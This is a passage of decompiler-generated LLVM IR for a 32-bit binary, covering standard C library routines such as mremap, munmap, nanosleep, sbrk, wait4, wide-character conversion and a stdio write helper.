  %v1_8051f05 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8051f05, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f05, -4095
  br i1 %tmp, label %dec_label_pc_8051f1c, label %dec_label_pc_8051f10

dec_label_pc_8051f10:                             ; preds = %entry
  %v0_8051f10 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f10 = call i32 @__errno_location(i32 %v0_8051f10)
  %v0_8051f15 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f15 = sub i32 0, %v0_8051f15
  %v2_8051f17 = inttoptr i32 %v1_8051f10 to i32*
  store i32 %v1_8051f15, i32* %v2_8051f17, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f1c

dec_label_pc_8051f1c:                             ; preds = %entry, %dec_label_pc_8051f10
  %v0_8051f1d = phi i32 [ %v1_8051f05, %entry ], [ -1, %dec_label_pc_8051f10 ]
  %v2_8051f20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f20, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051f1d

; uselistorder directives
  uselistorder i32 %v1_8051f05, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f1c, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051f24 = load i32, i32* @edi, align 4
  %v0_8051f25 = load i32, i32* @esi, align 4
  store i32 %v0_8051f25, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8051f3d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8051f45 = call i32 @mremap(i32 %v0_8051f3d, i32 %v0_8051f25, i32 %v0_8051f24, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8051f3d, i32* @ebx, align 4
  store i32 %v6_8051f45, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8051f45, -4095
  br i1 %tmp, label %dec_label_pc_8051f5d, label %dec_label_pc_8051f51

dec_label_pc_8051f51:                             ; preds = %entry
  %v1_8051f51 = call i32 @__errno_location(i32 %v0_8051f3d)
  %v0_8051f56 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051f56 = sub i32 0, %v0_8051f56
  %v2_8051f58 = inttoptr i32 %v1_8051f51 to i32*
  store i32 %v1_8051f56, i32* %v2_8051f58, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051f5d

dec_label_pc_8051f5d:                             ; preds = %entry, %dec_label_pc_8051f51
  %v0_8051f5e = phi i32 [ %v6_8051f45, %entry ], [ -1, %dec_label_pc_8051f51 ]
  %v2_8051f5d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f5d, i32* @edx, align 4
  %v2_8051f60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051f60, i32* @esi, align 4
  store i32 %v0_8051f24, i32* @edi, align 4
  ret i32 %v0_8051f5e

; uselistorder directives
  uselistorder i32 %v6_8051f45, { 1, 0, 2 }
  uselistorder i32 %v0_8051f3d, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f5d, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f64 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f64, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8051f77 = call i32 @munmap(i32 %v0_8051f64, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8051f77, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051f77, -4095
  br i1 %tmp, label %dec_label_pc_8051f90, label %dec_label_pc_8051f84

dec_label_pc_8051f84:                             ; preds = %entry
  %v0_8051f84 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f84 = call i32 @__errno_location(i32 %v0_8051f84)
  %v0_8051f89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f89 = sub i32 0, %v0_8051f89
  %v2_8051f8b = inttoptr i32 %v1_8051f84 to i32*
  store i32 %v1_8051f89, i32* %v2_8051f8b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f90

dec_label_pc_8051f90:                             ; preds = %entry, %dec_label_pc_8051f84
  %v0_8051f91 = phi i32 [ %v4_8051f77, %entry ], [ -1, %dec_label_pc_8051f84 ]
  %v2_8051f90 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f90, i32* @edx, align 4
  %v2_8051f94 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f94, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051f91

; uselistorder directives
  uselistorder i32 %v4_8051f77, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f90, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f98 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f98, i32* %stack_var_-4, align 4
  %v4_8051f9c = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8051f9c, i32* %ebx.global-to-local, align 4
  %v6_8051fab = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8051fab, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8051fab, -4095
  br i1 %tmp, label %dec_label_pc_8051fc4, label %dec_label_pc_8051fb8

dec_label_pc_8051fb8:                             ; preds = %entry
  %v0_8051fb8 = load i32, i32* %stack_var_-4, align 4
  %v1_8051fb8 = call i32 @__errno_location(i32 %v0_8051fb8)
  %v0_8051fbd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051fbd = sub i32 0, %v0_8051fbd
  %v2_8051fbf = inttoptr i32 %v1_8051fb8 to i32*
  store i32 %v1_8051fbd, i32* %v2_8051fbf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fc4

dec_label_pc_8051fc4:                             ; preds = %entry, %dec_label_pc_8051fb8
  %v0_8051fc5 = phi i32 [ %v6_8051fab, %entry ], [ -1, %dec_label_pc_8051fb8 ]
  %v2_8051fc8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fc8, i32* @ebx, align 4
  ret i32 %v0_8051fc5

; uselistorder directives
  uselistorder i32 %v6_8051fab, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc4, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051fcd = load i32, i32* @ebx, align 4
  %v0_8051fd1 = load i32, i32* @global_var_805e744.221, align 4
  %v1_8051fd1 = icmp eq i32 %v0_8051fd1, 0
  %v1_8051fdc = icmp eq i1 %v1_8051fd1, false
  br i1 %v1_8051fdc, label %dec_label_pc_8051fef, label %dec_label_pc_8051fde

dec_label_pc_8051fde:                             ; preds = %entry
  %v1_8051fe3 = call i32 @__GI_brk(i32 0)
  %v2_8051feb = icmp slt i32 %v1_8051fe3, 0
  br i1 %v2_8051feb, label %dec_label_pc_8052011, label %dec_label_pc_8051fde.dec_label_pc_8051fef_crit_edge

dec_label_pc_8051fde.dec_label_pc_8051fef_crit_edge: ; preds = %dec_label_pc_8051fde
  %v0_8051ff1.pre = load i32, i32* @global_var_805e744.221, align 4
  br label %dec_label_pc_8051fef

dec_label_pc_8051fef:                             ; preds = %dec_label_pc_8051fde.dec_label_pc_8051fef_crit_edge, %entry
  %v0_8051fff = phi i32 [ %v0_8051ff1.pre, %dec_label_pc_8051fde.dec_label_pc_8051fef_crit_edge ], [ %v0_8051fd1, %entry ]
  %v1_8051fef = icmp eq i32 %arg1, 0
  %v1_8051ff6 = icmp eq i1 %v1_8051fef, false
  br i1 %v1_8051ff6, label %dec_label_pc_8051ffc, label %dec_label_pc_8051ff8

dec_label_pc_8051ff8:                             ; preds = %dec_label_pc_8051fef
  br label %dec_label_pc_8052014

dec_label_pc_8051ffc:                             ; preds = %dec_label_pc_8051fef
  store i32 %v0_8051fff, i32* @ebx, align 4
  %v2_8052001 = add i32 %v0_8051fff, %arg1
  %v1_8052005 = call i32 @__GI_brk(i32 %v2_8052001)
  %v2_805200d = icmp slt i32 %v1_8052005, 0
  %v1_805200f = icmp eq i1 %v2_805200d, false
  br i1 %v1_805200f, label %dec_label_pc_8051ffc.dec_label_pc_8052014_crit_edge, label %dec_label_pc_8052011

dec_label_pc_8051ffc.dec_label_pc_8052014_crit_edge: ; preds = %dec_label_pc_8051ffc
  %v0_8052015.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052014

dec_label_pc_8052011:                             ; preds = %dec_label_pc_8051ffc, %dec_label_pc_8051fde
  br label %dec_label_pc_8052014

dec_label_pc_8052014:                             ; preds = %dec_label_pc_8051ffc.dec_label_pc_8052014_crit_edge, %dec_label_pc_8051ff8, %dec_label_pc_8052011
  %v0_8052015 = phi i32 [ %v0_8052015.pre, %dec_label_pc_8051ffc.dec_label_pc_8052014_crit_edge ], [ %v0_8051fff, %dec_label_pc_8051ff8 ], [ -1, %dec_label_pc_8052011 ]
  %v2_8052014 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052014, i32* @edx, align 4
  store i32 %v0_8051fcd, i32* @ebx, align 4
  ret i32 %v0_8052015

; uselistorder directives
  uselistorder i32 %v0_8051fff, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8052014, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805201c = load i32, i32* @edi, align 4
  %v0_805201d = load i32, i32* @esi, align 4
  store i32 %v0_805201d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8052031 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8052039 = call i32 @wait4(i32 %v0_8052031, i32 %v0_805201d, i32 %v0_805201c, i32 %tmp5)
  store i32 %v0_8052031, i32* @ebx, align 4
  store i32 %v4_8052039, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052039, -4095
  br i1 %tmp, label %dec_label_pc_8052051, label %dec_label_pc_8052045

dec_label_pc_8052045:                             ; preds = %entry
  %v1_8052045 = call i32 @__errno_location(i32 %v0_8052031)
  %v0_805204a = load i32, i32* %esi.global-to-local, align 4
  %v1_805204a = sub i32 0, %v0_805204a
  %v2_805204c = inttoptr i32 %v1_8052045 to i32*
  store i32 %v1_805204a, i32* %v2_805204c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052051

dec_label_pc_8052051:                             ; preds = %entry, %dec_label_pc_8052045
  %v0_8052052 = phi i32 [ %v4_8052039, %entry ], [ -1, %dec_label_pc_8052045 ]
  %v2_8052054 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052054, i32* @esi, align 4
  store i32 %v0_805201c, i32* @edi, align 4
  ret i32 %v0_8052052

; uselistorder directives
  uselistorder i32 %v4_8052039, { 1, 0, 2 }
  uselistorder i32 %v0_8052031, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_8052051, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_805e724.222 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_805206b = icmp eq i32 %tmp4, 0
  %v1_805206d = icmp eq i1 %v1_805206b, false
  br i1 %v1_805206d, label %dec_label_pc_8052075, label %dec_label_pc_805206f

dec_label_pc_805206f:                             ; preds = %entry
  %v2_805206f = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8052075

dec_label_pc_8052075:                             ; preds = %entry, %dec_label_pc_805206f
  %v0_8052091 = phi i32 [ %tmp4, %entry ], [ %v2_805206f, %dec_label_pc_805206f ]
  %v0_805207d = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_805206f ]
  %v2_8052075 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8052075, i32* %stack_var_-8, align 4
  store i32 %v0_805207d, i32* %stack_var_-4, align 4
  %v2_805208c = ptrtoint i32* %stack_var_-8 to i32
  %v5_8052092 = inttoptr i32 %v0_8052091 to i8*
  %v6_8052092 = call i32 @__GI_wcsnrtombs(i8* %v5_8052092, i32 %v2_805208c, i32 1, i32 16, i32 %tmp)
  %v1_805209c = icmp eq i32 %v6_8052092, 0
  %v3_805209e = select i1 %v1_805209c, i32 1, i32 %v6_8052092
  ret i32 %v3_805209e

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8052075, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_80520bd = inttoptr i32 %tmp to i8*
  %v6_80520bd = call i32 @__GI_wcsnrtombs(i8* %v5_80520bd, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_80520bd
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_80520cb = load i32, i32* @ebx, align 4
  %v4_80520cf = ptrtoint i8* %arg1 to i32
  store i32 %v4_80520cf, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80520df = icmp eq i8* %arg1, null
  store i1 %v1_80520df, i1* %zf.global-to-local, align 1
  br i1 %v1_80520df, label %dec_label_pc_80520ee, label %dec_label_pc_80520e3

dec_label_pc_80520e3:                             ; preds = %entry
  %v12_80520e3 = icmp eq i32 %v4_80520cf, %arg2
  store i1 %v12_80520e3, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80520ea = icmp eq i1 %v12_80520e3, false
  br i1 %v1_80520ea, label %dec_label_pc_8052111, label %dec_label_pc_805210b

dec_label_pc_80520ee:                             ; preds = %entry
  %v2_80520ee = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80520ee, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805210f

dec_label_pc_80520f7:                             ; preds = %dec_label_pc_805211f
  %v1_80520f7 = call i32 @__errno_location(i32 %v0_80520cb)
  %v1_80520fc = inttoptr i32 %v1_80520f7 to i32*
  store i32 84, i32* %v1_80520fc, align 4
  br label %dec_label_pc_8052145

dec_label_pc_8052107:                             ; preds = %dec_label_pc_8052126
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_805213a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052136

dec_label_pc_805210b:                             ; preds = %dec_label_pc_80520e3
  %v2_805210b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805210b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805210f

dec_label_pc_805210f:                             ; preds = %dec_label_pc_80520ee, %dec_label_pc_805210b
  %v2_805212816 = phi i32 [ %v2_80520ee, %dec_label_pc_80520ee ], [ %v2_805210b, %dec_label_pc_805210b ]
  %v1_805211412 = phi i32 [ -1, %dec_label_pc_80520ee ], [ %arg4, %dec_label_pc_805210b ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052111

dec_label_pc_8052111:                             ; preds = %dec_label_pc_80520e3, %dec_label_pc_805210f
  %v2_805212815 = phi i32 [ %v4_80520cf, %dec_label_pc_80520e3 ], [ %v2_805212816, %dec_label_pc_805210f ]
  %v0_8052116 = phi i32 [ %arg4, %dec_label_pc_80520e3 ], [ %v1_805211412, %dec_label_pc_805210f ]
  %v1_8052111 = inttoptr i32 %arg2 to i32*
  %v2_8052111 = load i32, i32* %v1_8052111, align 4
  store i32 %v2_8052111, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_8052116, %arg3
  %v5_8052118 = select i1 %tmp31, i32 %arg3, i32 %v0_8052116
  store i32 %v5_8052118, i32* %edi.global-to-local, align 4
  store i32 %v5_8052118, i32* @ecx, align 4
  %v1_80521323 = icmp eq i32 %v5_8052118, 0
  store i1 %v1_80521323, i1* %zf.global-to-local, align 1
  %v1_805213410 = icmp eq i1 %v1_80521323, false
  br i1 %v1_805213410, label %dec_label_pc_805211f, label %dec_label_pc_8052136

dec_label_pc_805211f:                             ; preds = %dec_label_pc_8052111, %dec_label_pc_805212c
  %v2_8052128 = phi i32 [ %v2_805212f, %dec_label_pc_805212c ], [ %v2_805212815, %dec_label_pc_8052111 ]
  %v0_805211f = phi i32 [ %v1_805212c, %dec_label_pc_805212c ], [ %v2_8052111, %dec_label_pc_8052111 ]
  %v1_805211f = inttoptr i32 %v0_805211f to i32*
  %v2_805211f = load i32, i32* %v1_805211f, align 4
  %v9_8052121 = icmp eq i32 %v2_805211f, 127
  store i1 %v9_8052121, i1* %zf.global-to-local, align 1
  %v6_8052124 = icmp ugt i32 %v2_805211f, 127
  br i1 %v6_8052124, label %dec_label_pc_80520f7, label %dec_label_pc_8052126

dec_label_pc_8052126:                             ; preds = %dec_label_pc_805211f
  %v3_8052126 = trunc i32 %v2_805211f to i8
  %v4_8052126 = icmp eq i8 %v3_8052126, 0
  store i1 %v4_8052126, i1* %zf.global-to-local, align 1
  %v3_8052128 = inttoptr i32 %v2_8052128 to i8*
  store i8 %v3_8052126, i8* %v3_8052128, align 1
  %v0_805212a = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805212a, label %dec_label_pc_8052107, label %dec_label_pc_805212c

dec_label_pc_805212c:                             ; preds = %dec_label_pc_8052126
  %v0_805212c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805212c = add i32 %v0_805212c, 4
  store i32 %v1_805212c, i32* %ebx.global-to-local, align 4
  %v0_805212f = load i32, i32* %edx.global-to-local, align 4
  %v1_805212f = load i32, i32* %esi.global-to-local, align 4
  %v2_805212f = add i32 %v1_805212f, %v0_805212f
  store i32 %v2_805212f, i32* %edx.global-to-local, align 4
  %v0_8052131 = load i32, i32* @ecx, align 4
  %v1_8052131 = add i32 %v0_8052131, -1
  %v8_8052131 = icmp eq i32 %v1_8052131, 0
  store i32 %v1_8052131, i32* @ecx, align 4
  store i1 %v8_8052131, i1* %zf.global-to-local, align 1
  %v1_8052134 = icmp eq i1 %v8_8052131, false
  br i1 %v1_8052134, label %dec_label_pc_805211f, label %dec_label_pc_8052136

dec_label_pc_8052136:                             ; preds = %dec_label_pc_805212c, %dec_label_pc_8052111, %dec_label_pc_8052107
  %v0_805213e = phi i32 [ 0, %dec_label_pc_8052107 ], [ %v2_8052111, %dec_label_pc_8052111 ], [ %v1_805212c, %dec_label_pc_805212c ]
  %v0_805213a = phi i32 [ %v0_805213a.pre, %dec_label_pc_8052107 ], [ %v2_805212815, %dec_label_pc_8052111 ], [ %v2_805212f, %dec_label_pc_805212c ]
  %v2_8052136 = ptrtoint i32* %stack_var_-32 to i32
  %v12_805213a = icmp eq i32 %v0_805213a, %v2_8052136
  store i1 %v12_805213a, i1* %zf.global-to-local, align 1
  br i1 %v12_805213a, label %dec_label_pc_8052141, label %dec_label_pc_805213e

dec_label_pc_805213e:                             ; preds = %dec_label_pc_8052136
  %v1_805213e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805213e = inttoptr i32 %v1_805213e to i32*
  store i32 %v0_805213e, i32* %v2_805213e, align 4
  br label %dec_label_pc_8052141

dec_label_pc_8052141:                             ; preds = %dec_label_pc_8052136, %dec_label_pc_805213e
  %v0_8052141 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052143 = load i32, i32* @ecx, align 4
  %v2_8052143 = sub i32 %v0_8052141, %v1_8052143
  %v12_8052143 = icmp eq i32 %v2_8052143, 0
  br label %dec_label_pc_8052145

dec_label_pc_8052145:                             ; preds = %dec_label_pc_80520f7, %dec_label_pc_8052141
  %storemerge = phi i1 [ %v12_8052143, %dec_label_pc_8052141 ], [ false, %dec_label_pc_80520f7 ]
  %storemerge1 = phi i32 [ %v2_8052143, %dec_label_pc_8052141 ], [ -1, %dec_label_pc_80520f7 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_8052145 = load i32, i32* @esp, align 4
  %v9_8052145 = icmp eq i32 %v0_8052145, -28
  store i1 %v9_8052145, i1* %zf.global-to-local, align 1
  store i32 %v0_80520cb, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_805213a, { 1, 0 }
  uselistorder i32 %v2_805212f, { 0, 2, 1 }
  uselistorder i32 %v1_805212c, { 0, 2, 1 }
  uselistorder i32 %v2_805211f, { 1, 2, 0 }
  uselistorder i32 %v2_8052111, { 1, 0, 2 }
  uselistorder i32 %v0_8052116, { 1, 0 }
  uselistorder i32 %v2_805212815, { 1, 0 }
  uselistorder i1 %v12_80520e3, { 1, 0 }
  uselistorder i32 %v4_80520cf, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 0, 2, 7, 4, 5, 6, 12, 8, 3, 9, 10, 11 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 5, 3, 6, 4 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052145, { 1, 0 }
  uselistorder label %dec_label_pc_8052141, { 1, 0 }
  uselistorder label %dec_label_pc_805211f, { 1, 0 }
  uselistorder label %dec_label_pc_8052111, { 1, 0 }
  uselistorder label %dec_label_pc_805210f, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_8052151 = load i32, i32* @edi, align 4
  %v0_8052153 = load i32, i32* @ebx, align 4
  %v15_8052154 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8052157 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052157, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80521635 = icmp eq i32 %arg3, 0
  store i1 %v1_80521635, i1* %zf.global-to-local, align 1
  br i1 %v1_80521635, label %dec_label_pc_80521c4, label %dec_label_pc_8052168.lr.ph

dec_label_pc_8052168.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8052168

dec_label_pc_8052168:                             ; preds = %dec_label_pc_8052184.dec_label_pc_8052168_crit_edge, %dec_label_pc_8052168.lr.ph
  %v0_8052175 = phi i32 [ %v4_8052157, %dec_label_pc_8052168.lr.ph ], [ %v0_8052175.pre, %dec_label_pc_8052184.dec_label_pc_8052168_crit_edge ]
  %v0_8052174 = phi i32 [ %arg2, %dec_label_pc_8052168.lr.ph ], [ %v2_8052186, %dec_label_pc_8052184.dec_label_pc_8052168_crit_edge ]
  %v0_8052170.in = phi i32 [ %arg3, %dec_label_pc_8052168.lr.ph ], [ %v2_8052184, %dec_label_pc_8052184.dec_label_pc_8052168_crit_edge ]
  %v4_8052170 = phi i32 [ %arg3, %dec_label_pc_8052168.lr.ph ], [ %v2_8052184, %dec_label_pc_8052184.dec_label_pc_8052168_crit_edge ]
  %v0_8052170 = icmp slt i32 %v0_8052170.in, 0
  store i32 %v4_8052170, i32* %esi.global-to-local, align 4
  %v2_8052170 = icmp eq i1 %v0_8052170, false
  %v5_8052170 = select i1 %v2_8052170, i32 %v4_8052170, i32 2147483647
  store i32 %v5_8052170, i32* %eax.global-to-local, align 4
  %v1_8052175 = add i32 %v0_8052175, 4
  %v2_8052175 = inttoptr i32 %v1_8052175 to i32*
  %v3_8052175 = load i32, i32* %v2_8052175, align 4
  %tmp37 = inttoptr i32 %v0_8052174 to i32*
  %v5_8052178 = call i32 @__libc_write(i32 %v3_8052175, i32* %tmp37, i32 %v5_8052170)
  store i32 %v5_8052178, i32* %eax.global-to-local, align 4
  %v1_8052180 = icmp eq i32 %v5_8052178, 0
  store i1 %v1_8052180, i1* %zf.global-to-local, align 1
  %v2_8052180 = icmp slt i32 %v5_8052178, 0
  br i1 %v2_8052180, label %dec_label_pc_805218a, label %dec_label_pc_8052184

dec_label_pc_8052184:                             ; preds = %dec_label_pc_8052168
  %v0_8052184 = load i32, i32* @ebx, align 4
  %v2_8052184 = sub i32 %v0_8052184, %v5_8052178
  %v12_8052184 = icmp eq i32 %v2_8052184, 0
  store i32 %v2_8052184, i32* @ebx, align 4
  %v0_8052186 = load i32, i32* @edi, align 4
  %v2_8052186 = add i32 %v0_8052186, %v5_8052178
  store i32 %v2_8052186, i32* @edi, align 4
  store i1 %v12_8052184, i1* %zf.global-to-local, align 1
  br i1 %v12_8052184, label %dec_label_pc_80521c4, label %dec_label_pc_8052184.dec_label_pc_8052168_crit_edge

dec_label_pc_8052184.dec_label_pc_8052168_crit_edge: ; preds = %dec_label_pc_8052184
  %v0_8052175.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052168

dec_label_pc_805218a:                             ; preds = %dec_label_pc_8052168
  %v0_805218a = load i32, i32* %ebp.global-to-local, align 4
  %v1_805218a = inttoptr i32 %v0_805218a to i32*
  %v2_805218a = load i32, i32* %v1_805218a, align 4
  store i32 %v2_805218a, i32* %eax.global-to-local, align 4
  %v1_805218d = add i32 %v0_805218a, 8
  %v2_805218d = inttoptr i32 %v1_805218d to i32*
  %v3_805218d = load i32, i32* %v2_805218d, align 4
  store i32 %v3_805218d, i32* @edx, align 4
  %v1_8052190 = or i32 %v2_805218a, 8
  store i32 %v1_8052190, i32* %eax.global-to-local, align 4
  %v1_8052193 = trunc i32 %v1_8052190 to i16
  %v3_8052193 = inttoptr i32 %v0_805218a to i16*
  store i16 %v1_8052193, i16* %v3_8052193, align 2
  %v0_8052197 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052197 = add i32 %v0_8052197, 12
  %v2_8052197 = inttoptr i32 %v1_8052197 to i32*
  %v3_8052197 = load i32, i32* %v2_8052197, align 4
  %v1_805219a = load i32, i32* @edx, align 4
  %v2_805219a = sub i32 %v3_8052197, %v1_805219a
  %v12_805219a = icmp eq i32 %v2_805219a, 0
  store i1 %v12_805219a, i1* %zf.global-to-local, align 1
  store i32 %v2_805219a, i32* %eax.global-to-local, align 4
  %v4_80521c0.pre = load i32, i32* @ebx, align 4
  br i1 %v12_805219a, label %dec_label_pc_80521c0, label %dec_label_pc_805219e

dec_label_pc_805219e:                             ; preds = %dec_label_pc_805218a
  %v12_805219e = icmp eq i32 %v2_805219a, %v4_80521c0.pre
  store i1 %v12_805219e, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_805219a, %v4_80521c0.pre
  %v3_80521a0 = load i32, i32* %esi.global-to-local, align 4
  %v5_80521a0 = select i1 %tmp, i32 %v2_805219a, i32 %v3_80521a0
  store i32 %v5_80521a0, i32* %esi.global-to-local, align 4
  %v0_80521a3.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80521a3

